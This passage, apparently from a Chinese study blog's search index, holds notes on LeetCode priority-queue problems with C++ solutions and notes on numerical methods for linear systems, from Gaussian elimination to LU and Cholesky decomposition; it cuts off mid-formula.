优先队列\n对于”最大值“，优先队列（堆）的大根堆可以帮助我们实时维护一系列元素中的最大值\n初始时将数nums的前k个元素放入优先队列中，每当向右移动窗口时可把一个新的元素放入优先队列中，此时堆顶的元素就是堆中所有元素的最大值。然而这个最大值可能并不在滑动窗口中，此时这个值在数组nums中的位置出现在滑动窗口左边界的左侧。因此当后续继续向右移动窗口时，这个值就永远不可能出现在滑动窗口中了，可以将其永久地从优先队列中移除\n不断地移除堆顶的元素，直到其确实出现在滑动窗口中。此时，堆顶元素就是滑动窗口中的最大值。为了方便判断堆顶元素与滑动窗口的位置关系可在优先队列中存储二元组(num,index)，表示元素num在数组中的下标为index\nclass Solution &#123;public:    vector&lt;int&gt; maxSlidingWindow(vector&lt;int&gt;&amp; nums, int k) &#123;        priority_queue&lt;pair&lt;int,int&gt;&gt; q;        for(int i=0;i&lt;k;i++)&#123;            q.emplace(nums[i],i);        &#125;        vector&lt;int&gt;result=&#123;q.top().first&#125;;        for(int i=k;i&lt;nums.size();i++)&#123;            q.emplace(nums[i],i);            while(q.top().second&lt;=i-k)&#123;                q.pop();            &#125;            result.push_back(q.top().first);        &#125;        return result;    &#125;&#125;;\n 前 K 个高频元素\n347. 前 K 个高频元素\n 优先队列\n优先队列对外接口只是从队头取元素，从队尾添加元素，再无其他取元素的方式，看起来就是一个队列\n而且优先队列内部元素是自动依照元素的权值排列，缺省情况下priority_queue利用max-heap（大顶堆）完成对元素的排序，这个大顶堆是以vector为表现形式的complete binary tree（完全二叉树）\n\n定义一个大小为k的大顶堆，每次移动更新大顶堆的时候，每次都把最大的元素弹出去了，那么怎么保留下来前K个高频元素呢？\n而且使用大顶堆要把所有元素进行排序，那能不能只排序k个元素呢？\n\n所以用小顶堆，因为要统计最大前k个元素，只有小顶堆每次将最小的元素弹出，最后小顶堆里积累的才是前k个最大元素\n\n寻找前k个最大元素流程\n\n\nclass Solution &#123;private:    class MyMinHeap&#123;    public:        bool operator()(const pair&lt;int,int&gt;&amp; lhs,const pair&lt;int,int&gt;&amp; rhs)&#123;            return lhs.second&gt;rhs.second;        &#125;    &#125;;public:    vector&lt;int&gt; topKFrequent(vector&lt;int&gt;&amp; nums, int k) &#123;        //统计元素出现频率        unordered_map&lt;int,int&gt;map;//map&lt;nums[i]&gt;对应出现的次数        for(int i=0;i&lt;nums.size();i++)&#123;//统计数组中每个数字出现次数            map[nums[i]]++;//如果还没有，先自动插入键nums[i]并把值初始化为0，再返回引用，把该键对应的计数加1        &#125;                //频率排序        priority_queue&lt;pair&lt;int,int&gt;,vector&lt;pair&lt;int,int&gt;&gt;,MyMinHeap&gt;pri_que;//声明了一个以vector为底层容器、元素是（数字,频率）二元组、按频率升序的优先队列pri_que        for(unordered_map&lt;int,int&gt;::iterator it=map.begin();it!=map.end();it++)&#123;//固定大小为k的小顶堆扫描所有频率的数值            pri_que.push(*it);            if(pri_que.size()&gt;k)&#123;//堆大小小于k则队列弹出，保证堆大小一直为k                pri_que.pop();            &#125;        &#125;                //找出前k个高频元素（小顶堆先弹出的是最小的，所以倒序来输出到数组）        vector&lt;int&gt; result(k);        for(int i=k-1;i&gt;=0;i--)&#123;            result[i]=pri_que.top().first;            pri_que.pop();        &#125;        return result;    &#125;&#125;;\n\n时间复杂度：O(nlogk)\n空间复杂度：O(n)\n\n 总结\n\n栈里面的元素在内存中是连续分布的么？\n\n\n\n陷阱1：栈是容器适配器，底层容器使用不同的容器，导致栈内数据在内存中不一定是连续分布的\n陷阱2：缺省情况下，默认底层容器是deque，那么deque在内存中的数据分布是什么样的呢？\n\n\n答案：不连续的\n\n递归为什么可以返回上一层位置？\n\n递归的实现是栈：每一次递归调用都会把函数的局部变量、参数值和返回地址等压入调用栈中，然后递归返回的时候，从栈顶弹出上一次递归的各项参数\n","tags":["LeetCode"]},{"title":"线性代数方程组的数值解法","url":"/2024/10/28/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E6%96%B9%E7%A8%8B%E7%BB%84%E7%9A%84%E6%95%B0%E5%80%BC%E8%A7%A3%E6%B3%95/","content":" 线性代数方程组的数值解法\n\nn阶线性代数方程组的一般形式\n{a11x1+a12x2+⋯+a1nxn=b1a21x1+a22x2+⋯+a2nxn=b2⋮an1x1+an2x2+⋯+annxn=bn\\begin{cases}\na_{11}x_1 + a_{12}x_2 + \\cdots + a_{1n}x_n = b_1 \\\\\na_{21}x_1 + a_{22}x_2 + \\cdots + a_{2n}x_n = b_2 \\\\\n\\vdots \\\\\na_{n1}x_1 + a_{n2}x_2 + \\cdots + a_{nn}x_n = b_n\n\\end{cases}\n⎩⎪⎪⎪⎪⎪⎨⎪⎪⎪⎪⎪⎧​a11​x1​+a12​x2​+⋯+a1n​xn​=b1​a21​x1​+a22​x2​+⋯+a2n​xn​=b2​⋮an1​x1​+an2​x2​+⋯+ann​xn​=bn​​\n或写成矩阵——向量形式：Ax=b，其中A为系数矩阵，x为解向量，b为右端常向量，分别为\nA=(a11⋯a1n⋮⋱⋮an1⋯ann),x=(x1x2⋮xn),b=(b1b2⋮bn)A = \\begin{pmatrix}\na_{11} &amp; \\cdots &amp; a_{1n} \\\\\n\\vdots &amp; \\ddots &amp; \\vdots \\\\\na_{n1} &amp; \\cdots &amp; a_{nn}\n\\end{pmatrix},\nx = \\begin{pmatrix}\nx_1 \\\\\nx_2 \\\\\n\\vdots \\\\\nx_n\n\\end{pmatrix},\nb = \\begin{pmatrix}\nb_1 \\\\\nb_2 \\\\\n\\vdots \\\\\nb_n\n\\end{pmatrix}\nA=⎝⎜⎜⎛​a11​⋮an1​​⋯⋱⋯​a1n​⋮ann​​⎠⎟⎟⎞​,x=⎝⎜⎜⎜⎜⎛​x1​x2​⋮xn​​⎠⎟⎟⎟⎟⎞​,b=⎝⎜⎜⎜⎜⎛​b1​b2​⋮bn​​⎠⎟⎟⎟⎟⎞​\n 直接消去法\n 顺序高斯消去法\n\n消元过程\n\n设\nakk(k)≠0a_{kk}^{(k)}\\ne0\nakk(k)​=0\n对k=1,2,…,n-1计算\n{mik=aik(k)akk(k)aij(k+1)=aij(k)−mikakj(k)bi(k+1)=bi(k)−mikbk(k)i,j=k+1,k+2,…,n\\left\\{\n\\begin{array}{l}\nm_{ik} = \\frac{a_{ik}^{(k)}}{a_{kk}^{(k)}} \\\\\na_{ij}^{(k+1)} = a_{ij}^{(k)} - m_{ik} a_{kj}^{(k)} \\\\\nb_{i}^{(k+1)} = b_{i}^{(k)} - m_{ik} b_{k}^{(k)}\n\\end{array}\n\\right.\n\\quad i,j=k+1,k+2,\\ldots,n\n⎩⎪⎪⎪⎨⎪⎪⎪⎧​mik​=akk(k)​aik(k)​​aij(k+1)​=aij(k)​−mik​akj(k)​bi(k+1)​=bi(k)​−mik​bk(k)​​i,j=k+1,k+2,…,n\n\n回代过程\n\n{xn=bn(n)ann(n)xi=(bi(i)−∑j=i+1naij(i)xjaii(i))/aii(i)i=n−1,…,2,1\\left\\{\n\\begin{array}{l}\nx_n = \\frac{b_n^{(n)}}{a_{nn}^{(n)}} \\\\\nx_i = \\left( b_i^{(i)} - \\sum_{j=i+1}^{n} \\frac{a_{ij}^{(i)} x_j}{a_{ii}^{(i)}} \\right) / a_{ii}^{(i)}\n\\end{array}\n\\right.\n\\quad i = n-1,\\ldots, 2, 1\n⎩⎪⎪⎨⎪⎪⎧​xn​=ann(n)​bn(n)​​xi​=(bi(i)​−∑j=i+1n​aii(i)​aij(i)​xj​​)/aii(i)​​i=n−1,…,2,1\n\n特点\n\n\n\n按消元规则运算后，对角线以下元素为0，故运算中对于对角线以下元素不进行计算，以减少计算量\n\n\n对角线下元素对回代求解无影响，故将乘数放在该处，即aik/akk→aik，i=k+1,k+2,…,n以节省存储单元\n\n\n对角线以上元素和常数项采用“原地”工作方式，即经变换后的元素仍放在原来的位置上\n{aij−aikakj→aijbi−aikbk→bii,j=k+1,k+2,…,n\\left\\{\n\\begin{array}{l}\na_{ij} - a_{ik}a_{kj} \\rightarrow a_{ij} \\\\\nb_{i} - a_{ik}b_{k} \\rightarrow b_{i}\n\\end{array}\n\\right.\n\\quad i, j = k + 1, k + 2, \\ldots, n\n{aij​−aik​akj​→aij​bi​−aik​bk​→bi​​i,j=k+1,k+2,…,n\n以节省存储单元\n\n\n回代后的值仍被放在常数项存储单元\nbnann→bn\\frac{b_n}{a_{nn}} \\rightarrow b_n\nann​bn​​→bn​\n(bi−∑j=i+1naijxj)/aii→bi,i=n−1,n−2,…,1\\left( b_i - \\sum_{j=i+1}^{n} a_{ij} x_j \\right) / a_{ii} \\rightarrow b_i,\\quad i = n-1, n-2, \\ldots, 1\n(bi​−j=i+1∑n​aij​xj​)/aii​→bi​,i=n−1,n−2,…,1\n以节省存储单元，这时b1,b2,…,bn单元中存放的就是输出值x1,x2,…,xn\n\n\n\n使用条件\n\n将第k步消xk时用的方程及其系数分别叫作第k步的主方程和主行，而xk的系数akk(k)叫作第k步的主元素，要求各步主元素不为0\n\n 定理\n\n\n方程组系数矩阵的顺序主子式全不为零，则高斯消去法能实现方程组的求解\n\n顺序主子式：设方程组系数矩阵A=(aij)n，其顺序主子式\nDi=∣a11⋯a1i⋮⋱⋮ai1⋯aii∣,i=1,2,…,nD_i = \\begin{vmatrix}\na_{11} &amp; \\cdots &amp; a_{1i} \\\\\n\\vdots &amp; \\ddots &amp; \\vdots \\\\\na_{i1} &amp; \\cdots &amp; a_{ii}\n\\end{vmatrix}, \\quad i = 1, 2, \\ldots, n\nDi​=∣∣∣∣∣∣∣∣​a11​⋮ai1​​⋯⋱⋯​a1i​⋮aii​​∣∣∣∣∣∣∣∣​,i=1,2,…,n\n非奇异矩阵：|A|≠0\n\n\n\n设方程组Ax=b，如果系数矩阵A为严格对角占优矩阵，则用高斯消去法求解时，主元素akk(k)全不为零\n\n严格对角占优矩阵：矩阵A=(aij)n每一行对角元素的绝对值都大于同行其他元素绝对值之和\n∣aii∣&gt;∑j=1j≠in∣aij∣,i=1,2,…,n\\left| a_{ii} \\right| &gt; \\sum_{\\substack{j=1 \\\\ j \\neq i}}^{n} \\left| a_{ij} \\right|, \\quad i = 1, 2, \\ldots, n\n∣aii​∣&gt;j=1j=i​∑n​∣aij​∣,i=1,2,…,n\n\n\n\n高斯消元法求解n阶线性方程组共需乘除法次数近似为1/3n3\n\n\n 列主元高斯消去法\n\n顺序高斯消元法有如下两弊端：\n\n顺序消元过程中可能出现主元素akk(k)=0\nakk(k)≠0，但其绝对值很小，用它作为除数也会导致其他元素的数量级急剧增大和使舍入误差扩大，影响计算结果精度\n\n\n为避免在消元过程确定乘数时所用除数是零或绝对值小的数，即零主元或小主元，在每一次消元之前，要增加一个选主元的过程，将绝对值大的元素交换到主对角线的位置上。根据交换的方法又分成全选主元和列选主元两种选主元方法\n全选主元是当变换到第k步时，从右下角n-k+1阶子阵中选取绝对值最大的元素，然后通过行交换与列交换将其交换到akk的位置上，并且保留下交换的信息，以供后面调整解向量中分量的次序时使用\n列选主元是当消元到第k步时，从k列的akk以下（包括akk）的各元素中选出绝对值最大的，然后通过行交换将其交换到akk的位置上。交换系数矩阵中的两行（包括常数项），只相当于两个方程的位置交换了，因此，列选主元不影响求解的结果\n\n列选主元：设主元在第l(k≤l≤n)个方程，即\n∣alk∣=max⁡k⩽i⩽n∣aik∣|a_{lk}|=\\max_{k\\leqslant i\\leqslant n}|a_{ik}|\n∣alk​∣=k⩽i⩽nmax​∣aik​∣\n若l≠k，将l和k方程互易位置，使新的akk成为主元，然后继续进行\n列选主元比全选主元的运算量小，但一般可以满足精度要求，所以列选主元更常被采用\n严格对角占优矩阵可保证akk(k)就是主元\n\n\n 定理\n\n列主元消去法在解方程组时，还可求出系数行列式。设系数矩阵A=(a11⋯a1n⋮⋱⋮an1⋯ann)A = \\begin{pmatrix}\na_{11} &amp; \\cdots &amp; a_{1n} \\\\\n\\vdots &amp; \\ddots &amp; \\vdots \\\\\na_{n1} &amp; \\cdots &amp; a_{nn}\n\\end{pmatrix}\nA=⎝⎜⎜⎛​a11​⋮an1​​⋯⋱⋯​a1n​⋮ann​​⎠⎟⎟⎞​\n用列主元消去法将其转换为上三角形矩阵，对角线上元素为a11(1),a22(2),…,ann(n)，于是行列式det⁡(A)=(−1)ma11(1)a22(2)⋯ann(n)\\det(A) = (-1)^m a_{11}^{(1)} a_{22}^{(2)} \\cdots a_{nn}^{(n)}\ndet(A)=(−1)ma11(1)​a22(2)​⋯ann(n)​\n其中m为所进行的行交换次数\n\n 高斯——若尔当消去法\n前述的高斯消去法有消元和回代两过程，对消元过程稍加改变使方程组化为对角形方程组Dx=b形式，其中矩阵D为对角形矩阵\nD=(a11(1)a22(2)⋱ann(n))D = \\begin{pmatrix}\na_{11}^{(1)} &amp; &amp; &amp; \\\\\n&amp; a_{22}^{(2)} &amp; &amp; \\\\\n&amp; &amp; \\ddots &amp; \\\\\n&amp; &amp; &amp; a_{nn}^{(n)}\n\\end{pmatrix}\nD=⎝⎜⎜⎜⎜⎛​a11(1)​​a22(2)​​⋱​ann(n)​​⎠⎟⎟⎟⎟⎞​\n此时求解无需回代\n\n特点\n\n每次消元时利用主元将其所在列的其余元素全部消为0，即在第k次消元时，把k列中（k,k）位置以下和以上的元素消为0，但主行不进行消元\n高斯——若尔当消去法执行一次归一化过程需要进行n-k+1次除法，而执行一次消去过程需要进行(n-1)(n-k+1)次乘法，因此高斯——若尔当消去法进行的乘除法总计算工作量为\n∑k=1n(n−k+1)n=n22(n+1)≈12n3\\sum_{k=1}^{n} (n - k + 1)n = \\frac{n^2}{2}(n + 1) \\approx \\frac{1}{2}n^3\nk=1∑n​(n−k+1)n=2n2​(n+1)≈21​n3\n高斯——若尔当消去法比高斯消去法多了约1/6的计算工作量，但高斯——若尔当消去法无需回代，算法结构稍许简单\n\n用归一化的高斯——若尔当消去法求矩阵的逆比较方便\n\n设A非奇异，则A-1存在，记\nA−1=X=(x11⋯x1n⋮⋱⋮xn1⋯xnn)A^{-1}=X = \\begin{pmatrix}\nx_{11} &amp; \\cdots &amp; x_{1n} \\\\\n\\vdots &amp; \\ddots &amp; \\vdots \\\\\nx_{n1} &amp; \\cdots &amp; x_{nn}\n\\end{pmatrix}\nA−1=X=⎝⎜⎜⎛​x11​⋮xn1​​⋯⋱⋯​x1n​⋮xnn​​⎠⎟⎟⎞​\n则求A的逆矩阵A-1等价于求n阶矩阵X，使AX=I，其中I为n×n的单位矩阵。将X和I分块\nX=(x1,x2,⋯ ,xn),I=(e1,e2,⋯ ,en)X = (x_1, x_2, \\cdots, x_n), I = (e_1, e_2, \\cdots, e_n)\nX=(x1​,x2​,⋯,xn​),I=(e1​,e2​,⋯,en​)\n其中\nxi=(x1i,x2i,⋯ ,xni)Tx_i = (x_{1i}, x_{2i}, \\cdots, x_{ni})^T\nxi​=(x1i​,x2i​,⋯,xni​)T\ne1=(1,0,⋯ ,0)T,⋯ ,en=(0,⋯ ,0,1)Te_1 = (1, 0, \\cdots, 0)^T, \\cdots, e_n = (0, \\cdots, 0, 1)^T\ne1​=(1,0,⋯,0)T,⋯,en​=(0,⋯,0,1)T\n则求解AX=I等价于求解系数矩阵相同的n个方程组Axj=ej，j=1,2,…,n，即\nAx1=(10⋮0),Ax2=(01⋮0),…,Axn=(0⋮01)Ax_1 = \\begin{pmatrix} 1 \\\\ 0 \\\\ \\vdots \\\\ 0 \\end{pmatrix}, \\quad\nAx_2 = \\begin{pmatrix} 0 \\\\ 1 \\\\ \\vdots \\\\ 0 \\end{pmatrix}, \\quad\n\\ldots, \\quad\nAx_n = \\begin{pmatrix} 0 \\\\ \\vdots \\\\ 0 \\\\ 1 \\end{pmatrix}\nAx1​=⎝⎜⎜⎜⎜⎛​10⋮0​⎠⎟⎟⎟⎟⎞​,Ax2​=⎝⎜⎜⎜⎜⎛​01⋮0​⎠⎟⎟⎟⎟⎞​,…,Axn​=⎝⎜⎜⎜⎜⎛​0⋮01​⎠⎟⎟⎟⎟⎞​\n可用上述高斯——若尔当消去法（或再加上选主元技术）求解这n个方程组\n 三角分解法\n LU\n\n\n杜里特尔分解：把A分解成一个单位下三角阵L和一个上三角阵U的乘积\n\n\n克洛特分解：把A分解成一个下三角阵L和一个单位上三角阵U的乘积\n\n\n矩阵A各阶主子式不为零，则可唯一地分解成一个单位下三角阵L和一个非奇异的上三角阵U的乘积\n\n各阶主子式不为零也可说成顺序主子阵非奇异。上述分解即是杜里特尔分解，对于克洛特分解所需条件也是一样的\n\n顺序主子阵非奇异，因为非奇异矩阵就不一定存在LU分解，设\nA=(0110)A=\\begin{pmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{pmatrix}\nA=(01​10​)\n则|A|=-1≠0，A非奇异。若A有LU分解，即存在数a,b,c,d,使\n(0110)=(1a1)(bdc)\\begin{pmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{pmatrix} = \\begin{pmatrix} 1 &amp; \\\\ a &amp; 1 \\end{pmatrix} \\begin{pmatrix} b &amp; d \\\\&amp; c \\end{pmatrix}\n(01​10​)=(1a​1​)(b​dc​)\n比较等式两边第一列，有b=0，ab=1\n上两式不能同时成立，即A不存在LU分解\n\n下三角形矩阵的乘积仍是下三角形矩阵\n\n 杜里特尔分解\n(a11a12⋯a1na21a22⋯a2n⋮⋮⋱⋮an1an2⋯ann)=(1l211⋮⋮⋱ln1ln2⋯1)(u11u12⋯u1nu22⋯u2n⋱⋮unn)\\begin{pmatrix}\na_{11} &amp; a_{12} &amp; \\cdots &amp; a_{1n} \\\\\na_{21} &amp; a_{22} &amp; \\cdots &amp; a_{2n} \\\\\n\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\na_{n1} &amp; a_{n2} &amp; \\cdots &amp; a_{nn}\n\\end{pmatrix}\n=\n\\begin{pmatrix}\n1 &amp; &amp; &amp; \\\\\nl_{21} &amp; 1 &amp; &amp; \\\\\n\\vdots &amp; \\vdots &amp; \\ddots &amp; \\\\\nl_{n1} &amp; l_{n2} &amp; \\cdots &amp; 1\n\\end{pmatrix}\n\\begin{pmatrix}\nu_{11} &amp; u_{12} &amp; \\cdots &amp; u_{1n} \\\\\n &amp; u_{22} &amp; \\cdots &amp; u_{2n} \\\\\n &amp; &amp; \\ddots &amp; \\vdots \\\\\n &amp; &amp; &amp; u_{nn}\n\\end{pmatrix}\n⎝⎜⎜⎜⎜⎛​a11​a21​⋮an1​​a12​a22​⋮an2​​⋯⋯⋱⋯​a1n​a2n​⋮ann​​⎠⎟⎟⎟⎟⎞​=⎝⎜⎜⎜⎜⎛​1l21​⋮ln1​​1⋮ln2​​⋱⋯​1​⎠⎟⎟⎟⎟⎞​⎝⎜⎜⎜⎜⎛​u11​​u12​u22​​⋯⋯⋱​u1n​u2n​⋮unn​​⎠⎟⎟⎟⎟⎞​\n\n由矩阵乘法规则\na1i=u1i,i=1,2,…,na_{1i} = u_{1i}, \\quad i = 1, 2, \\ldots, n\na1i​=u1i​,i=1,2,…,n\nai1=li1u11,i=2,3,…,na_{i1} = l_{i1} u_{11}, \\quad i = 2, 3, \\ldots, n\nai1​=li1​u11​,i=2,3,…,n\n\n得U的第一行元素和L的第一列元素\nu1i=a1i,i=1,2,…,nu_{1i} = a_{1i}, \\quad i = 1, 2, \\ldots, n\nu1i​=a1i​,i=1,2,…,n\nli1=ai1u11,i=2,3,…,nl_{i1} = \\frac{a_{i1}}{u_{11}}, \\quad i = 2, 3, \\ldots, n\nli1​=u11​ai1​​,i=2,3,…,n\n\n当得出U的前r-1行元素和L的前r-1列元素，，对于i=r,r+1,…,n，有\nari=∑k=1nlrkuki=∑k=1r−1lrkuki+uria_{ri} = \\sum_{k=1}^{n} l_{rk} u_{ki} = \\sum_{k=1}^{r-1} l_{rk} u_{ki} + u_{ri}\nari​=k=1∑n​lrk​uki​=k=1∑r−1​lrk​uki​+uri​\nair=∑k=1nlikukr=∑k=1r−1likukr+lirurra_{ir} = \\sum_{k=1}^{n} l_{ik} u_{kr} = \\sum_{k=1}^{r-1} l_{ik} u_{kr} + l_{ir} u_{rr}\nair​=k=1∑n​lik​ukr​=k=1∑r−1​lik​ukr​+lir​urr​\n\n得计算U的第r行和L的第r列元素的公式\nuri=ari−∑k=1r−1lrkuki,i=r,r+1,…,nu_{ri} = a_{ri} - \\sum_{k=1}^{r-1} l_{rk} u_{ki}, \\quad i = r, r + 1, \\ldots, n\nuri​=ari​−k=1∑r−1​lrk​uki​,i=r,r+1,…,n\nlir=(air−∑k=1r−1likukr)/urr,i=r+1,r+2,…,nl_{ir} = \\left( a_{ir} - \\sum_{k=1}^{r-1} l_{ik} u_{kr} \\right) / u_{rr}, \\quad i = r + 1, r + 2, \\ldots, n\nlir​=(air​−k=1∑r−1​lik​ukr​)/urr​,i=r+1,r+2,…,n\nA的行列式|A|=|L||U|=u11u22…unn\n 解线性方程组\n求解线性方程组Ax=b时，当对A进行LU分解时，等价于求解LUx=b，可归结为利用递推计算相继求解两个三角形（系数矩阵为三角矩阵）方程组，用顺代，由Ly=b，求出y，再利用回代，由Ux=y求出x\n\n\nLy=b，即计算\n{y1=b1yi=bi−∑k=1i−1likyk,i=2,3,…,n\\begin{cases}\ny_1 = b_1 \\\\\ny_i = b_i - \\sum_{k=1}^{i-1} l_{ik} y_k, \\quad i = 2, 3, \\ldots, n\n\\end{cases}\n{y1​=b1​yi​=bi​−∑k=1i−1​lik​yk​,i=2,3,…,n​\n\n\nUx=y，即计算\n{xn=yn/unnxi=(yi−∑k=i+1nuikxk)/uii,i=n−1,…,2,1\\begin{cases}\nx_n = y_n / u_{nn} \\\\\nx_i = \\left( y_i - \\sum_{k=i+1}^{n} u_{ik} x_k \\right) / u_{ii}, \\quad i = n-1, \\ldots, 2, 1\n\\end{cases}\n{xn​=yn​/unn​xi​=(yi​−∑k=i+1n​uik​xk​)/uii​,i=n−1,…,2,1​\n\n\n用LU直接分解的方法求解线性方程组的计算量为1/3n3，和高斯消去法需要的计算量的数量级基本相同\n 求逆矩阵\n\n对矩阵A和单位矩阵I组成的增广矩阵AI进行杜里特尔分解AI→LUY，其中A，I，L，U，Y∈Rn×n，L为单位下三角阵，U为上三角阵\n对j=1,2,…,n求解方程组系Ux=yi，其中yi是矩阵Y的第j列。解记为x=aj，j=1,2,…,n\nA-1=(a1,a2,…,an)\n\n 克洛特分解\n\n分解形式\n\n(a11⋯a1n⋮⋱⋮an1⋯ann)=(l11l21l22⋮⋮⋱ln1ln2⋯lnn)(1u12u13⋯u1n1u23⋯u2n⋱⋮1)\\begin{pmatrix}\na_{11} &amp; \\cdots &amp; a_{1n} \\\\\n\\vdots &amp; \\ddots &amp; \\vdots \\\\\na_{n1} &amp; \\cdots &amp; a_{nn}\n\\end{pmatrix}\n=\n\\begin{pmatrix}\nl_{11} &amp; &amp; \\\\\nl_{21} &amp; l_{22} &amp;  \\\\\n\\vdots &amp; \\vdots &amp; \\ddots \\\\\nl_{n1} &amp; l_{n2} &amp; \\cdots &amp; l_{nn}\n\\end{pmatrix}\n\\begin{pmatrix}\n1 &amp; u_{12} &amp; u_{13} &amp; \\cdots &amp; u_{1n} \\\\\n &amp; 1 &amp; u_{23} &amp; \\cdots &amp; u_{2n} \\\\\n &amp; &amp; \\ddots &amp; &amp; \\vdots \\\\\n &amp; &amp; &amp; &amp; 1\n\\end{pmatrix}\n⎝⎜⎜⎛​a11​⋮an1​​⋯⋱⋯​a1n​⋮ann​​⎠⎟⎟⎞​=⎝⎜⎜⎜⎜⎛​l11​l21​⋮ln1​​l22​⋮ln2​​⋱⋯​lnn​​⎠⎟⎟⎟⎟⎞​⎝⎜⎜⎜⎜⎛​1​u12​1​u13​u23​⋱​⋯⋯​u1n​u2n​⋮1​⎠⎟⎟⎟⎟⎞​\n可得\nli1=ai1,i=1,2,⋯ ,nl_{i1} = a_{i1}, \\quad i = 1, 2, \\cdots, n\nli1​=ai1​,i=1,2,⋯,n\nu1i=a1il11,i=2,3,⋯ ,nu_{1i} = \\frac{a_{1i}}{l_{11}}, \\quad i = 2, 3, \\cdots, n\nu1i​=l11​a1i​​,i=2,3,⋯,n\n且当L的前r-1列元素和U的前r-1行元素已经算出以后，对于i=r,r+1,…,n有\nlir=air−∑k=1r−1likukr,i=r,r+1,⋯ ,nl_{ir} = a_{ir} - \\sum_{k=1}^{r-1} l_{ik} u_{kr}, \\quad i = r, r + 1, \\cdots, n\nlir​=air​−k=1∑r−1​lik​ukr​,i=r,r+1,⋯,n\nuri=(ari−∑k=1r−1lrkuki)/lrr,i=r+1,r+2,⋯ ,nu_{ri} = \\left( a_{ri} - \\sum_{k=1}^{r-1} l_{rk} u_{ki} \\right) / l_{rr}, \\quad i = r + 1, r + 2, \\cdots, n\nuri​=(ari​−k=1∑r−1​lrk​uki​)/lrr​,i=r+1,r+2,⋯,n\n\n解线性方程组\n\n\n\n计算li1，i=1,2,…,n和uli，i=2,3,…,n\n\n\n对于r=2,3,…,n计算lir，i=r,r+1,…,n和uri，i=r+1,r+2,…,n\n\n\n求解Ly=b，即计算\n{y1=b1l11yi=(bi−∑k=1i−1likyk)/lii,i=2,3,⋯ ,n\\begin{cases}\ny_1 = \\frac{b_1}{l_{11}} \\\\\ny_i = (b_i - \\sum_{k=1}^{i-1} l_{ik} y_k)/l_{ii}, \\quad i = 2, 3, \\cdots, n\n\\end{cases}\n{y1​=l11​b1​​yi​=(bi​−∑k=1i−1​lik​yk​)/lii​,i=2,3,⋯,n​\n\n\n求解Ux=y，即计算\n{xn=ynxi=yi−∑k=i+1nuikxk,i=n−1,⋯ ,2,1\\begin{cases}\nx_n = y_n \\\\\nx_i = y_i - \\sum_{k=i+1}^{n} u_{ik} x_k, \\quad i = n-1, \\cdots, 2, 1\n\\end{cases}\n{xn​=yn​xi​=yi​−∑k=i+1n​uik​xk​,i=n−1,⋯,2,1​\n\n\n 平方根法\n对称正定矩阵：矩阵A∈Rn×n满足AT=A，且对任意非零向量x∈Rn，有(Ax,x)=xTAx＞0\n\n对称正定矩阵A的对角元为正，即aii＞0，i=1,2,…,n\n实对称矩阵A正定的充要条件是A的所有特征值为正\n对称正定矩阵非奇异，其逆亦为对称正定矩阵\n实对称矩阵A正定的充要条件是A的所有顺序主子式为正\n正定矩阵的顺序主子阵是正定的\n\n 乔累斯基分解\n\n对称正定矩阵A存在唯一的单位下三角矩阵L和对角矩阵D，使A=LDLT\n\n乔累斯基分解：对称正定矩阵A存在唯一的对角元素均为正数的下三角矩阵L，使A=LLT\n\n乔累斯基分解所需要的乘除次数约为1/6n3数量级，差不多比LU分解节省一半的工作量，但要进行n次开方运算\n\n将A=LLT写成\n(a11⋯a1n⋱⋮aii⋮⋱an1⋯ann)=(l11l21l22⋮⋱ln1ln2⋯lnn)(l11l21⋯ln1l22⋯ln2⋱⋮ln)\\begin{pmatrix}\na_{11} &amp; &amp; \\cdots&amp;  &amp; a_{1n} \\\\\n &amp;\\ddots&amp; &amp; &amp; \\\\\n\\vdots&amp;  &amp; a_{ii} &amp; &amp; \\vdots \\\\\n &amp; &amp; &amp;\\ddots &amp; \\\\\na_{n1} &amp; &amp; \\cdots &amp; &amp; a_{nn}\n\\end{pmatrix}\n=\n\\begin{pmatrix}\nl_{11} &amp; &amp; \\\\\nl_{21} &amp; l_{22} &amp; \\\\\n\\vdots &amp;  &amp; \\ddots \\\\\nl_{n1} &amp; l_{n2} &amp; \\cdots &amp; l_{nn}\n\\end{pmatrix}\n\\begin{pmatrix}\nl_{11} &amp; l_{21} &amp; \\cdots &amp; l_{n1} \\\\\n &amp; l_{22} &amp; \\cdots &amp; l_{n2} \\\\\n &amp; &amp; \\ddots &amp; \\vdots \\\\\n &amp; &amp; &amp; l_{n}\n\\end{pmatrix}\n⎝⎜⎜⎜⎜⎜⎜⎛​a11​⋮an1​​⋱​⋯aii​⋯​⋱​a1n​⋮ann​​⎠⎟⎟⎟⎟⎟⎟⎞​=⎝⎜⎜⎜⎜⎛​l11​l21​⋮ln1​​l22​ln2​​⋱⋯​lnn​​⎠⎟⎟⎟⎟⎞​⎝⎜⎜⎜⎜⎛​l11​​l21​l22​​⋯⋯⋱​ln1​ln2​⋮ln​​⎠⎟⎟⎟⎟⎞​\n对于i=1,2,…,n，有\n{lii=(ai−∑k=1i−1lik2)12lji=(aj−∑k=1i−1ljklik)/li,j=i+1,i+2,⋯ ,n\\left\\{\n\\begin{array}{l}\nl_{i i}=\\left(a_{i}-\\sum_{k=1}^{i-1} l_{i k}^{2}\\right)^{\\frac{1}{2}}\\\\\nl_{j i}=\\left(a_{j}-\\sum_{k=1}^{i-1} l_{j k} l_{i k}\\right)/ l_{i},\\quad j=i+1, i+2,\\cdots, n\n\\end{array}\n\\right.\n⎩⎪⎨⎪⎧​lii​=(ai​−∑k=1i−1​lik2​)21​lji​=(aj​−∑k=1i−1​ljk​lik​)/li​,j=i+1,i+2,⋯,n​\n∣A∣=∣LLT∣=∣L∣∣LT∣=∏i=1nli2|A|=\\left| LL^{T}\\right|=|L|\\left| L^{T}\\right|=\\prod_{i=1}^{n} l_{i}^{2}\n∣A∣=∣∣∣​LLT∣∣∣​=∣L∣∣∣∣​LT∣∣∣​=i=1∏n​li2​\n\n求解对称正定方程组\n\n将A=LLT代入Ax=b，有LLTx=b，令LTx=y，有\n{Ly=bLTx=y\\left\\{\n\\begin{array}{l}\nL y = b \\\\\nL^T x = y\n\\end{array}\n\\right.\n{Ly=bLTx=y​\n相应的求解公式\n{yi=(bi−∑k=1i−1likyk)/lii,i=1,2,…,nxi=(yi−∑k=i+1nlkixk)/lii,i=n,n−1,…,1\\begin{cases}\ny_i = (b_i - \\sum_{k=1}^{i-1} l_{ik} y_k)/l_{ii}, \\quad i = 1, 2, \\ldots, n \\\\\nx_i = (y_i - 